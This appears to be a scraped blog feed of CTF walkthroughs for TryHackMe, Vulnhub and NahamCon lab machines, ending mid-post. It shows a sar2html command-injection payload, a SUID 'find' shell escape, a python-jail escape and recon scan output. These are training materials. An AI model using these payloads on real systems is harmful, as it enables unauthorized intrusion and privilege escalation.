out:First the note.txt::Here is a zip file for you, unzip it !\"#9175\"A password to our zip? this is almost too easy.Unzipping our file, we have the Joey.zip file containing another zip protected file and a note.txt, *sighThe note file says:‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Vulnhub/TenderFoot]‚îî‚îÄ$ cat note.txt==============================================================================================================Not this time DUDE!Just G00GLE and learn how to crack zip passwords :)you will learn new thing!==============================================================================================================Touche::crack the gift.zip file and we got this:Just a clue for us to find SUID binaries, of course we would have done that if he didn‚Äôt lead us onüòÇChecking for SUID binaries, I spotted an odd binary, on executing it, we became another user, AwesomeCop the user2.txt flag.Now to gain elevated privileges, if there‚Äôs anything this box taught me is always try to get user creds to login properly over a pty cause sometimes the SUID Biniaries set for that user might not really display as they should.Luckily for us we have a new clue, a base32 encoded charset::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Vulnhub/TenderFoot]‚îî‚îÄ$ echo -n OBQXG43XMQ5FSMDVINZDIY3LJUZQ==== | base32 -dpasswd:Y0uCr4ckM3 Cool this might just be chandlers creds. lets try logging inRoot toothEven without GTFOBins enabling sudo on ftp is a clean shot to get root.And that‚Äôs it, fully compromised!Due to the emergence of findings of newer vulnerabilities and evolving tech, there are so many ways to get root instantly on this machine, one of which is Pwnkit(CVE-2021-4034)which allows us abuse pkexec by virtue of SUID bit set on the binary, nonetheless those are all unintended ways and not ideal.:) The difference between a hacker and a Noob, is that a hacker has failed more times than a Noob has ever tried.Thanks for the read.From Rami3l with &lt;3.Salaam." }, { "title": "NahamCon 2022 CTF - challenge walkthrough", "url": "/posts/NahamConCTF/", "categories": "CTF", "tags": "NahamCon, NahamconCTF, Netcat, Warmup Challenges, NahamSec, ctfs, John Hammond", "date": "2022-05-01 00:00:00 +0100", "snippet": "PREFACEConsidering how big of a fan I am of Naham and John Hammond, this ctf was quit a big deal to me! it was so much fun and involved categories which I really liked like malware analysis, eventho I couldnt solve some lol, I would only be posting solutions to the questions a humble noob like myself could solve, so my apologies if you sought answers which you did not find present here. &lt;3nb: This will frequently be updated for a couple days.WARMUP CHALLENGESThis category was created basically for beginners to get their feet wet‚Ä¶ I guess cause they were easy on a whole other level, so hey lets get to it!FlagcatThis one‚Äôs basic, I grabbed the flagcat file, read with cat, and that‚Äôs pretty much it!‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Documents/Nahamcon/General]‚îî‚îÄ$ cat flagcat ---------------------------------------- | flag{ab3cbaf45def9056dbfad706d597fb53} | ---------------------------------------- || (\\__/) || (‚Ä¢„ÖÖ‚Ä¢) // / „ÄÄ „Å•QuirkyOn downloading the provided file, and reading it, it contained ‚ÄúLong ASCII texts with no line termnators‚Äù ‚îÄ‚îÄ(azazel„âøazazel)-[~/Documents/Nahamcon/General]‚îî‚îÄ$ file quirky quirky: ASCII text, with very long lines (1612), with no line terminators ‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Documents/Nahamcon/General]‚îî‚îÄ$ cat quirky \\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d\\x49\\x48\\x44\\x52\\x00\\x00\\x00\\x6f\\x00\\x00\\x00\\x6f\\x01\\x03\\x00\\x00\\x00\\xd8\\x0b\\x0c\\x23\\x00\\x00\\x00\\x06\\x50\\x4c\\x54\\x45\\x00\\x00\\x00\\xff\\xff\\xff\\xa5\\xd9\\x9f\\xdd\\x00\\x00\\x00\\x02\\x74\\x52\\x4e\\x53\\xff\\xff\\xc8\\xb5\\xdf\\xc7\\x00\\x00\\x00\\x09\\x70\\x48\\x59\\x73\\x00\\x00\\x0b\\x12\\x00\\x00\\x0b\\x12\\x01\\xd2\\xdd\\x7e\\xfc\\x00\\x00\\x01\\x25\\x49\\x44\\x41\\x54\\x38\\x8d\\xd5\\xd4\\x31\\x8e\\xc3\\x20\\x10\\x05\\xd0\\xb1\\x5c\\xd0\\x25\\x17\\x40\\x9a\\x6b\\xd0\\x71\\x25\\xfb\\x02\\xb6\\xf7\\x02\\xce\\x95\\xe8\\xb8\\x06\\x92\\x2f\\x40\\x3a\\x0a\\x94\\xd9\\x8f\\x23\\x45\\xbb\\xc5\\x66\\x68\\x52\\x2c\\xa2\\xe0\\x21\\x21\\xcf\\x0c\\x83\\x49\\x7e\\x0d\\xfa\\x1f\\xcc\\x44\\x8b\\xaf\\x6b\\xb0\\x44\\xac\\xf2\\x2e\\x75\\x72\\xe3\\x66\\xea\\x2a\\x1d\\x0c\\x76\\xc1\\xe7\\x82\\x9d\\x4c\\x17\\x27\\x97\\xc8\\xd4\\x4e\\xae\\x91\\xd6\\x62\\xbb\\x28\\x75\\x8e\\xf5\\x1a\\xed\\x2b\\xc8\\x37\\x44\\xbe\\x73\\xb4\\x98\\xaf\\xf4\\xdf\\xf0\\x1c\\xf6\\x5a\\x7e\\x16\\xf6\\x4f\\x66\\xb2\\x64\\x78\\xf3\\xc7\\xee\\x3a\\xe8\\x0f\\xac\\x25\\x10\\x39\\x56\\x79\\x2f\\x74\\x71\\xe3\\x57\\x94\\x87\\x11\\x9d\\xf1\\xd8\\x5b\\x6c\\x34\\x79\\x9d\\x0f\\x8f\\xb3\\xb2\\xfb\\x73\\x53\\xa5\\x3b\\x36\\x33\\xa2\\xf8\\x73\\x60\\x95\\x52\\xea\\x10\\xd3\\xc5\\xf0\\x7e\\x46\\xf5\\x9e\\x77\\x19\\x6f\\x6d\\x4a\\x76\\x3a\\x25\\xa0\\x49\\xda\\x05\\xdd\\x22\\xab\\x44\\xbe\\x38\\x28\\x25\\xcd\\xa5\\x83\\x92\\x86\\x82\\x90\\x0e\\x14\\x53\\x67\\x44\\x1f\\xd6\\x39\\xa0\\xfe\\xac\\xb3\\x9d\\x95\\xdd\\x10\\x19\\x51\\x89\\x91\\x3d\\x21\\xa4\\xec\\x58\\x25\\x3a\\x76\\xf2\\x69\\x68\\xaf\\x4c\\x54\\xe2\\x2d\\x2c\\x1e\\x95\\xe4\\xec\\x59\\x27\\xae\\x52\\xd0\\xb4\\x34\\x3c\\xf3\\x55\\x89\\x85\\xf0\\xc3\\x71\\x17\\x0b\\xdf\\x42\\x22\\x27\\x3a\\xf1\\x7e\\xd1\\x2d\\x68\\xaa\\xa2\\xb3\\xe5\\xdb\\x3a\\x56\\xb2\\xd1\\xf9\\xb9\\x5f\\xee\\xa7\\xf8\\x0d\\x69\\xf5\\x37\\x77\\x6e\\xf8\\x09\\x97\\x00\\x00\\x00\\x00\\x49\\x45\\x4e\\x44\\xae\\x42\\x60\\x82 it definitely looks like a dump of a file but what type? Lets just pass the file to cyberchef and see what he can cook up lol a QR code, awesome! cyberchef has a qr decoder yunno, so, on decoding, we got our flag! PrisonerThis was awesome, had a little hint from a comrade on this one, this was my second rendezvous with a python jail(check out tryhackme‚Äôs Tokyo Ghoul for a more challenging prison). From the challenge name I already knew that was what I would be dealing with, to get to it, deploy the instance, and ssh into it, automatically it sends us to jail, touche, to exit the script‚Äôs hold ctrl+d and you should have the classic python &gt;&gt;&gt; IDLE prompt now, meaning we are still in some sorta python pty, this gives us the advantage of executing commands of either reading files directly or completely spawn a shell;) like the one we use to import a pty for tty stabilisation, here‚Äôs my two methods:METHOD 1: spawning a pty shell to have full access to the environment. METHOD 2 : using the import os library and executing arbitrary commands through the IDLE shell with the os.system(\"\")function all we just have to do here import the os library and pass the commands we want to execute to the os.system function as a parameter(as strings). Exit vimVim is said to be one of the first intimidating tool of every noob lmao This challenge was all sorts of funny, John hammond has an incredible sense of humor. once upon a time, vim used to be my worst nightmare, luckily for me I did the Tryhackme-Vim:Toolbox room a couple weeks ago, now I barely even use nano lol. I‚Äôd advise you try out the room if you‚Äôre ‚ÄúViMoPObIc‚Äù you could also checkout this post!there are esentially 3 ways to exit vim: you could either:: :wq ‚Äì to write and save (include the ‚Äú:‚Äù) :q! ‚Äì force quit (include the ‚Äú:‚Äù) ZZ (capital ‚Äúzee zee‚Äù) this saves and quits. (My personal favourite)Crash OverrideThis was personally my favourite task, if how I solved it was the intended way? I have no idea but keep reading you might learn a new netcat trick! hehee:) Or maybe old lol Here we are provided with three essential files: A crash override file (ELF 64-bit LSB pie executable) A makefile (An essential file!) Crash_override.c (The C source code) compile with gcc cc or g++lately I have been having frequent encounters with C I just had to learn some basics, one of those ‚Äúbasics‚Äù includes the MakefileA makefile is a special file (named as 'Makefile' only) that consists of targets, dependencies and commands, structured in a way that makes it easy for a programmer to compile the program.Imagine being a C/C++ programmer and having to type ‚Äúgcc -fnostack-protector blah blah blah‚Äù every single time you write a program and want to compile into an executable or object file for every test! stressful asf yeah? after all tech exists to make life easy, hence the relevance of a makefile!Luckily for us we were provided a make file, yay! so we know how to compile the C program that we were given, to get to it::check this page for more insight on makefiles The makefile instructions says:‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Documents/Nahamcon/crashoverride]‚îî‚îÄ$ cat Makefile 1 ‚®Øall: \tgcc -fno-stack-protector -z execstack crash_override.c -o crash_overrideAwesome we know how to compile, so just pass the switches to gcc and the C soure code.Its always helpful to read the source code yunno::It looks like this source file is the other half of what we have on our netcat connection, from my noob understanding of the script, once compiled, if executed on a computer, it reads a file called ‚Äúflag.txt‚Äù by passing it to the fopen function, also passes through a couple if statements and exits its runtime.On execution;‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Documents/Nahamcon/crashoverride]‚îî‚îÄ$ ./crash_override HACK THE PLANET!!!!!!flag?How to execute it on the remote computer? We already have access through netcat, so to pass the compiled binary I‚Äôm just going to redirect the output of the ELF binary into our netcat session! And Boom! we have our flag.Read the rulesThis one is a walk in the park, just go to the ctf help page and read the source code! for compensation of my laziness to include a screenshot, the flag is located in a comment on line 273:)WizardThis one was fun, it was centered around encoding and decoding, all you have to do is cook your way to the flag ;) &amp; use Rapid tables.Here‚Äôs the fix, we answer 6 questions correctly from Gandalf the great and he gives us our flag, cool!First was a binary to ASCII question::Next question was a hex to ASCII conversion::Next question was an Octal to ASCII question, this wizard was starting to really push itwe would have to convert from octal -- base10 aka int aka Decimal --- hex--- ascii just like regular Maths yunno!I used Rapid Tables for this one, since it has the capabilities to do a direct octal to hex conversion: Next question, is a decimal to ASCII conversion:: FIfth question is a base64 conversion to ascii::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Documents/Nahamcon]‚îî‚îÄ$ echo -n 'QmFzZXMgb24gYmFzZXMgb24gYmFzZXMgb24gYmFzZXMgOik=' | base64 -dBases on bases on bases on bases :) For the 6th question, a Little to Big-Endian conversion::To be honest this was the first time I had to deal with endian conversions, but here‚Äôs what I did after a liitle reseach::I used this site don‚Äôt forget to change from Binary hex mode if you use this site to solve.Note that your result from that site converts little HEX endian to Big HEX endian and you would require a conversion from hex to ascii since the wizard demands a plaintext answer! And that‚Äôs our flag, thank you Gandalf. lol An alternative would be to use Cyber chef‚Äôs ‚Äúswap endianess‚Äù feature to convert it to big endian and then decode the hex.Techncal SupportFor the last and easiest warmup challenge, all we have to do is join the discord server go to the ‚Äúctf-help‚Äù channel, the flag is the heading of the channel. and sensei John Hammond has a flag waiting there for us!Thank you for your time, this was a long read lol, this would be updated more frequently to include writeups for the remaining challenges!Salaam! Rami3l." }, { "title": "BoilerCTF Walkthrough", "url": "/posts/BoilerCTF-Writeup/", "categories": "TryHackMe", "tags": "Command Injection, CMS, Enumeration, Sar2HTML", "date": "2022-04-19 00:00:00 +0100", "snippet": "PrefaceHey there! have to say this was frustratingly fun lol, filled with so many dead ends too. You could check it out here Tryhackme, I‚Äôll walk you through buddy!Hints Recursive enumeration Don‚Äôt bother Bruteforcing‚Ä¶ You‚Äôre overthinking it. 2HTML Exploit-DBScanning &amp; Enumeration::As always:‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~]‚îî‚îÄ$ sudo nmap -sV -sC -sS 10.10.47.112 -vv -p- -T4 130 ‚®ØStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 21:14 WATNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 21:14Completed NSE at 21:14, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 21:14Completed NSE at 21:14, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 21:14Completed NSE at 21:14, 0.00s elapsedInitiating Ping Scan at 21:14Scanning 10.10.47.112 [4 ports]Completed Ping Scan at 21:14, 0.32s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 21:14Completed Parallel DNS resolution of 1 host. at 21:14, 0.28s elapsedInitiating SYN Stealth Scan at 21:14Scanning 10.10.47.112 [65535 ports]Discovered open port 80/tcp on 10.10.47.112Discovered open port 21/tcp on 10.10.47.112Increasing send delay for 10.10.47.112 from 0 to 5 due to 874 out of 2184 dropped probes since last increase.Increasing send delay for 10.10.47.112 from 5 to 10 due to 11 out of 23 dropped probes since last increase.SYN Stealth Scan Timing: About 4.69% done; ETC: 21:25 (0:10:30 remaining)SYN Stealth Scan Timing: About 16.23% done; ETC: 21:33 (0:15:19 remaining)SYN Stealth Scan Timing: About 17.14% done; ETC: 21:35 (0:16:46 remaining)Warning: 10.10.47.112 giving up on port because retransmission cap hit (6).Discovered open port 55007/tcp on 10.10.47.112SYN Stealth Scan Timing: About 80.18% done; ETC: 21:38 (0:04:40 remaining)Discovered open port 10000/tcp on 10.10.47.112SYN Stealth Scan Timing: About 85.05% done; ETC: 21:38 (0:03:29 remaining)SYN Stealth Scan Timing: About 90.04% done; ETC: 21:38 (0:02:18 remaining)SYN Stealth Scan Timing: About 95.08% done; ETC: 21:37 (0:01:08 remaining)Completed SYN Stealth Scan at 21:38, 1406.17s elapsed (65535 total ports)Initiating Service scan at 21:38Scanning 4 services on 10.10.47.112Completed Service scan at 21:38, 6.57s elapsed (4 services on 1 host)NSE: Script scanning 10.10.47.112.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 21:38NSE: [ftp-bounce 10.10.47.112:21] PORT response: 500 Illegal PORT command.Completed NSE at 21:39, 30.30s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 21:39Completed NSE at 21:39, 1.89s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 21:39Completed NSE at 21:39, 0.01s elapsedNmap scan report for 10.10.47.112Host is up, received echo-reply ttl 63 (0.26s latency).Scanned at 2022-04-19 21:14:58 WAT for 1445sNot shown: 65406 closed tcp ports (reset), 125 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.45.27| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry |_/|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)10000/tcp open http syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).|_http-favicon: Unknown favicon MD5: 37A72E58B1456207D2E4673B3F824AAF| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS55007/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt| 256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=| 256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2pService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 21:39Completed NSE at 21:39, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 21:39Completed NSE at 21:39, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 21:39Completed NSE at 21:39, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1446.21 seconds Raw packets sent: 79609 (3.503MB) | Rcvd: 88232 (6.783MB)From our scans we have Ftp, http, ssh(on a rather uncommon port) and Webmin to work with.We got anon logins from ftp, so I hit the server A ‚Äúfull‚Äù(ls -la) directory listing gave me the .info.txt which was well‚Ä¶pretty useless:‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Tryhackme/BoilerCTF]‚îî‚îÄ$ cat info.txt Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!Contained a ROT13 encoded text which translated into a humble reminder from Seth, on enumreration as the key‚Ä¶ How very thoughtful:) Moving on, I decide to check out our buddy on port 80!We‚Äôre greeted with the default Apache landing page, on checking the source I find no suspiscious content, say less:: Robots.txt tells gives us this info:User-agent: *Disallow: //tmp/.ssh/yellow/not/a+rabbit/hole/or/is/it079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075At this point I realized this was going to be a frustrating room, the sequence of numerics at the end seemed like a decimal encoding but on translating it didn‚Äôt mean anything of importance‚Ä¶Let‚Äôs visit the ‚ÄúJoomla‚Äù directory, it is apparently a CMS with a crazy tonne of exploits, at this point I ran a recursive directory bruteforce to find a login page, so maybe I could gain admin access and try to spawn a shell::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~]‚îî‚îÄ$ dirsearch -u http://10.10.47.112/ -w /usr/share/wordlists/dirb/common.txt -t 10 -r _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 10 | Wordlist size: 4613Output File: /home/azazel/.dirsearch/reports/10.10.47.112/-_22-04-19_21-29-55.txtError Log: /home/azazel/.dirsearch/logs/errors-22-04-19_21-29-55.logTarget: http://10.10.47.112/[21:29:56] Starting: [21:31:09] 200 - 11KB - /index.html[21:31:14] 301 - 313B - /joomla -&gt; http://10.10.47.112/joomla/ (Added to queue)[21:31:23] 301 - 313B - /manual -&gt; http://10.10.47.112/manual/ (Added to queue)[21:31:54] 200 - 257B - /robots.txt[21:31:59] 403 - 300B - /server-status[21:32:33] Starting: joomla/[21:32:37] 301 - 322B - /joomla/_archive -&gt; http://10.10.47.112/joomla/_archive/ (Added to queue)[21:32:37] 301 - 323B - /joomla/_database -&gt; http://10.10.47.112/joomla/_database/ (Added to queue)[21:32:37] 301 - 320B - /joomla/_files -&gt; http://10.10.47.112/joomla/_files/ (Added to queue)[21:32:39] 301 - 319B - /joomla/_test -&gt; http://10.10.47.112/joomla/_test/ (Added to queue) [21:32:40] 301 - 318B - /joomla/~www -&gt; http://10.10.47.112/joomla/~www/ (Added to queue)[21:32:45] 301 - 327B - /joomla/administrator -&gt; http://10.10.47.112/joomla/administrator/ (Added to queue)[21:32:55] 301 - 317B - /joomla/bin -&gt; http://10.10.47.112/joomla/bin/ (Added to queue)[21:32:57] 301 - 319B - /joomla/build -&gt; http://10.10.47.112/joomla/build/ (Added to queue)[21:32:58] 301 - 319B - /joomla/cache -&gt; http://10.10.47.112/joomla/cache/ (Added to queue)[21:33:06] 301 - 324B - /joomla/components -&gt; http://10.10.47.112/joomla/components/ (Added to queue)[21:33:39] 301 - 320B - /joomla/images -&gt; http://10.10.47.112/joomla/images/ (Added to queue)[21:33:40] 301 - 322B - /joomla/includes -&gt; http://10.10.47.112/joomla/includes/ (Added to queue)[21:33:41] 200 - 12KB - /joomla/index.php[21:33:42] 301 - 326B - /joomla/installation -&gt; http://10.10.47.112/joomla/installation/ (Added to queue)[21:33:47] 301 - 322B - /joomla/language -&gt; http://10.10.47.112/joomla/language/ (Added to queue)[21:33:47] 301 - 321B - /joomla/layouts -&gt; http://10.10.47.112/joomla/layouts/ (Added to queue)[21:33:48] 301 - 323B - /joomla/libraries -&gt; http://10.10.47.112/joomla/libraries/ (Added to queue)[21:33:55] 301 - 319B - /joomla/media -&gt; http://10.10.47.112/joomla/media/ (Added to queue)[21:33:58] 301 - 321B - /joomla/modules -&gt; http://10.10.47.112/joomla/modules/ (Added to queue)[21:34:12] 301 - 321B - /joomla/plugins -&gt; http://10.10.47.112/joomla/plugins/ (Added to queue)[21:34:44] 301 - 323B - /joomla/templates -&gt; http://10.10.47.112/joomla/templates/ (Added to queue)[21:34:45] 301 - 319B - /joomla/tests -&gt; http://10.10.47.112/joomla/tests/ (Added to queue)[21:34:46] 301 - 317B - /joomla/tmp -&gt; http://10.10.47.112/joomla/tmp/ (Added to queue)[21:35:05] Starting: manual/[21:35:45] 301 - 316B - /manual/da -&gt; http://10.10.47.112/manual/da/ (Added to queue)[21:35:46] 301 - 316B - /manual/de -&gt; http://10.10.47.112/manual/de/ (Added to queue)[21:35:54] 301 - 316B - /manual/en -&gt; http://10.10.47.112/manual/en/ (Added to queue)[21:35:56] 301 - 316B - /manual/es -&gt; http://10.10.47.112/manual/es/ (Added to queue)[21:36:04] 301 - 316B - /manual/fr -&gt; http://10.10.47.112/manual/fr/ (Added to queue)[21:36:14] 301 - 320B - /manual/images -&gt; http://10.10.47.112/manual/images/ (Added to queue)[21:36:15] 200 - 626B - /manual/index.html[21:36:19] 301 - 316B - /manual/ja -&gt; http://10.10.47.112/manual/ja/ (Added to queue)[21:36:22] 301 - 316B - /manual/ko -&gt; http://10.10.47.112/manual/ko/ (Added to queue)[21:37:18] 301 - 319B - /manual/style -&gt; http://10.10.47.112/manual/style/ (Added to queue)[21:37:27] 301 - 316B - /manual/tr -&gt; http://10.10.47.112/manual/tr/ (Added to queue)[21:37:44] 301 - 319B - /manual/zh-cn -&gt; http://10.10.47.112/manual/zh-cn/ (Added to queue)[21:37:44] Starting: joomla/_archive/[21:38:57] 200 - 162B - /joomla/_archive/index.html[21:40:35] Starting: joomla/_database/[21:41:52] 200 - 160B - /joomla/_database/index.html[21:43:30] Starting: joomla/_files/[21:44:50] 200 - 168B - /joomla/_files/index.html[21:46:35] Starting: joomla/_test/[21:47:53] 200 - 5KB - /joomla/_test/index.php [21:49:42] Starting: joomla/~www/[21:51:03] 200 - 162B - /joomla/~www/index.html[21:52:41] Starting: joomla/administrator/[21:53:15] 301 - 333B - /joomla/administrator/cache -&gt; http://10.10.47.112/joomla/administrator/cache/ (Added to queue)[21:53:23] 301 - 338B - /joomla/administrator/components -&gt; http://10.10.47.112/joomla/administrator/components/ (Added to queue)[21:53:56] 301 - 332B - /joomla/administrator/help -&gt; http://10.10.47.112/joomla/administrator/help/ [21:54:01] 200 - 5KB - /joomla/administrator/index.php[21:54:14] 301 - 332B - /joomla/administrator/logs -&gt; http://10.10.47.112/joomla/administrator/logs/ (Added to queue)[21:54:21] 301 - 335B - /joomla/administrator/modules -&gt; http://10.10.47.112/joomla/administrator/modules/ (Added to queue)[21:55:18] 301 - 337B - /joomla/administrator/templates -&gt; http://10.10.47.112/joomla/administrator/templates/ (Added to queue)CTRL+C detected: Pausing threads, please wait...Sheesh, alot of sub directories uhn?First thing I checked was this -&gt; http://10.10.47.112/joomla/administrator/Which led to a login page, a bruteforce attempt isnt so wise here cause I found a csrf token in the source code(I read up on this and apparently it would hinder an exhaustive search since it expires on first login attempt)I decided to swiftly visit all the other subdirs to find anything we could leverage to maybe spawn a shell or get ssh keys somehow‚Ä¶ One of the few encoded texts translated to this :: This machine was taunting me at this point.ExploitationüíÄTo cut to the chase, after all the swift fails and checking webmin on port 10000, I decided to revisit this weird test directory I found/joomla/_test -&gt; http://10.10.47.112/joomla/_test/We find a sar2html page out of curiousity::Basically a sar2html is an opensource project that converts sar binary data to graphical htmlMy interest specifically was in exploiting this‚Ä¶ on checking exploitdb, an RCE exploit exists for vulnerable version 3.2.1:: From this exploit:In web application you will see index.php?plot url extension.http://&lt;ipaddr&gt;/index.php?plot=;&lt;command-here&gt; will execute the command you entered. After command injection press \"select # host\" then your command's output will appear bottom side of the scroll screen.It looks like once we replace the post argument in the query string in the url with a command of our choice, it executes on the system, like a passive command injection!(passive because the results of the executed commands are not directly outputted onto the screen but still executes in the background by the system) Awesome!To test our exploit::To reveal the result of our query-inserted command, just click on the ‚ÄúSelect Host‚Äù option and the drop down will reveal the results of the query which was passed as a system command!It also appears to have a weird log.txt document in the current directory when you execute ‚Äúls -la‚Äù by inserting it like sohttp://&lt;ipaddr&gt;/index.php?plot=;ls -laJust cat log.txt, and click select host to display the command output.::http://&lt;ipaddr&gt;/index.php?plot=; cat log.txtIt looks like the log file contains ssh creds of a user ‚ÄúBasterd‚Äù and his pass all in plaintext. HeheeüòàInitial Access &amp; Priviledge escalation::Hackers don‚Äôt break in, we log inIn ‚Äúhis‚Äù home directory seems there is some sort of backup script that belongs to another use who has a little more priviledges by virtue of SUID bit set for him on the find binary, cat the file and we have his creds, horizontal privesc with with his creds and then navigate to his home directory, the .secret file contains the first flag and then to privesc we have SUID bit set on findfind / -type f -perm -4000 2&gt;/dev/null OR find / -type f -perm -u=s 2&gt;dev/nullGTFOBins says we could use the misconfigured binary by running/usr/bin/find . -exec /bin/sh -p \\; -quitAnd spawn a priviledged shell and read our root flag, like so:: Rooted!!Salam, from Rami3l." }, { "title": "Pickle Rick Writeup", "url": "/posts/PickleRick-Writeup/", "categories": "TryHackMe", "tags": "Command Injection, Web shell, Directory Enumeration, Dirsearch", "date": "2022-04-11 00:00:00 +0100", "snippet": "Pickle RickThis Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.Check it out here: TryHackMePrefaceHey there! I‚Äôll be honest this was the first time I used a web shell lol and it was indeed much fun, I‚Äôll walk you through how I went about it XD, funfact Rick&amp;Morty has been my go-to fav cartoon since 2015, eyepatch morty is my buddy and I genuinely have a deep seated hatred for Jerry and his insipidity ;) but as always I‚Äôll be leaving hints before I drop the spoilers, and by spoilers I mean the answers lol just kidding you won‚Äôt find glaring answers here buddy hehee Hints source page command injection? web shells directory enumeration(try a different directory busting wordlist) extensions.(.php)A‚Äôight so as always, a port scan first::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Tryhackme/PickleRick]‚îî‚îÄ$ nmap -sC -sV 10.10.220.220 -Pn -vv -p 1-1024 -T4 -o nmapWarning: The -o option is deprecated. Please use -oNStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 18:18 WATNSE: Loaded 155 scripts for scanning.Initiating Connect Scan at 18:18Scanning 10.10.220.220 [1024 ports]Discovered open port 80/tcp on 10.10.220.220Not shown: 1022 closed tcp ports (conn-refused)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 21:86:91:05:1b:b6:3c:1a:91:a3:6b:a6:fe:a3:28:b9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOejy/mcAGAdwTSazZu0TOhmJzXnVoAlpDkpPFEnxBppNiIDf11gJkgAz/kNJ/Xzpy5/r4EcBm5VlyD1OHbgp4BB7/+XmWFLIiombdwcGEYrnXJ86DdY8JPu4enMn85mhi2eI8/QwHk5PmaIBufGk6YAdrAunR2T3UfZriuJB4MXQw4ElicxJ+EEuaaMirwhVx8p9i1HqC2c5U95N22y/CBDETIgGZHkZQkMC2HpHREbcs7tTPQdPbv9TSL7Ie0Tvdi6LFAMx2zZmfBprnAUT6DsNvRmu5uyGisQpw4STgwjPVJ/BJInFEHPS25Afv/2BVMfhX3af6yJQA4QPuBKJF| 256 91:18:52:30:3e:b6:e0:29:0d:72:91:17:b7:64:05:03 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEehoL4UxfT2BMPVEAxmPHcDhmZhmzE1AD2zqGHtqgDLkdjKE3xMgqVle5l3DNb6D/44/pTyklMJWmPTTY9t8S0=| 256 d2:1b:90:6d:32:2f:cb:0e:64:af:61:e7:60:34:95:96 (ED25519)|_ssh-ed25519 